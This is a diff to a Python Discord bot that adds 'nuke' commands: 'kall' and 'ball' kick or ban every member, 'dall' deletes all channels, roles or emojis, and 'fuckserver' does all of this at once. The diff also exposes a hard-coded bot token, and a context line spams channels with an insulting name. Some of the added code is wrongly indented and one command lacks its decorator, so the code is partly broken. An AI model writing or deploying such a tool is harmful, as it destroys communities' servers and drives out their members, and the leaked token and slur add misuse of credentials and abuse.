@@ -33,19 +33,9 @@ from discord.utils import get
 ## --                    -- ##
 
 
-
-## -- SET BOT APPLICATION TOKEN -- ##
-bot.run ("NTk3Nzk1NzgyMTk1OTM3Mjgw.XSNqYA.r6AMd7GMUKYQagIItjDCJgL7kOc")
-
-
-
-## -- SET BOT COMMAND PREFIX -- ##
+## -- Declares the bot, passes it a prefix and lets it know to (hopefully) only listen to itself. -- ##
 bot = commands.Bot(command_prefix='&&')
 client = commands.Bot(command_prefix='&&')
-
-
-
-## -- OTHER -- ##
 bot.remove_command('help')
 
 
@@ -67,7 +57,6 @@ async def on_ready():
 ## --              -- ##
 
 
-
 ## -- KICK -- ##
 #Command: !kick #
 @bot.command(pass_context=True)
@@ -80,8 +69,113 @@ async def kick(ctx, member : discord.Member):
 ## -- KICK ALL -- ##
 #Command: !kall #
 @bot.command(pass_context=True)
-async def kall(member : discord.Member):
-    await member.kick()
+    async def kall(ctx):
+        await ctx.message.delete()
+        for user in list(ctx.guild.members):
+            try:
+                await ctx.guild.kick(user)
+                print (f"{user.name} has been kicked from {ctx.guild.name}")
+            except:
+                print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
+        print ("Action Completed: kall")
+
+
+
+## -- BAN ALL -- ##
+#Command: !ball #
+@bot.command(pass_context=True)
+    async def ball(ctx):
+        await ctx.message.delete()
+        for user in list(ctx.guild.members):
+            try:
+                await ctx.guild.ban(user)
+                print (f"{user.name} has been banned from {ctx.guild.name}")
+            except:
+                print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
+        print ("Action Completed: ball")  
+
+
+
+## -- DELETE ALL ___ -- ##
+#Command: !dall [condition] #
+async def dall(ctx, condition):
+        if condition.lower() == "channels":
+            for channel in list(ctx.guild.channels):
+                try:
+                    await channel.delete()
+                    print (f"{channel.name} has been deleted in {ctx.guild.name}")
+                except:
+                    print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
+            print ("Action Completed: dall channels")
+        elif condition.lower() == "roles":
+            for role in list(ctx.guild.roles):
+                try:
+                    await role.delete()
+                    print (f"{role.name} has been deleted in {ctx.guild.name}")
+                except:
+                    print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
+            print ("Action Completed: dall roles")
+        elif condition.lower() == "emojis":
+            for emoji in list(ctx.guild.emojis):
+                try:
+                    await emoji.delete()
+                    print (f"{emoji.name} has been deleted in {ctx.guild.name}")
+                except:
+                    print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
+            print ("Action Completed: dall emojis")
+        elif condition.lower() == "all":
+            for channel in list(ctx.guild.channels):
+                try:
+                    await channel.delete()
+                    print (f"{channel.name} has been deleted in {ctx.guild.name}")
+                except:
+                    print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
+            for role in list(ctx.guild.roles):
+                try:
+                    await role.delete()
+                    print (f"{role.name} has been deleted in {ctx.guild.name}")
+                except:
+                    print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
+            for emoji in list(ctx.guild.emojis):
+                try:
+                    await emoji.delete()
+                    print (f"{emoji.name} has been deleted in {ctx.guild.name}")
+                except:
+                    print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
+            print ("Action Completed: dall all")
+
+
+
+## -- FUCK SERVER -- ##
+#Command: !fuckserver #
+@bot.command(pass_context=True)
+    async def fuckserver(ctx):
+        await ctx.message.delete()
+        for emoji in list(ctx.guild.emojis):
+            try:
+                await emoji.delete()
+                print (f"{emoji.name} has been deleted in {ctx.guild.name}")
+            except:
+                print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
+        for channel in list(ctx.guild.channels):
+            try:
+                await channel.delete()
+                print (f"{channel.name} has been deleted in {ctx.guild.name}")
+            except:
+                print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
+        for role in list(ctx.guild.roles):
+            try:
+                await role.delete()
+                print (f"{role.name} has been deleted in {ctx.guild.name}")
+            except:
+                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
+        for user in list(ctx.guild.members):
+            try:
+                await ctx.guild.ban(user)
+                print (f"{user.name} has been banned from {ctx.guild.name}")
+            except:
+                print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
+        print ("Server has been fucked.")
 
 
 
@@ -2594,3 +2688,7 @@ async def channels(ctx):
     await guild.create_text_channel('Russian is autistic')
     await guild.create_text_channel('Russian is autistic')    
     await guild.create_text_channel('Russian is autistic')
+
+
+## -- STARTS THE BOT BY PASSING APPLICATION TOKEN -- ##
+bot.run ("NTk3Nzk1NzgyMTk1OTM3Mjgw.XSNqYA.r6AMd7GMUKYQagIItjDCJgL7kOc")
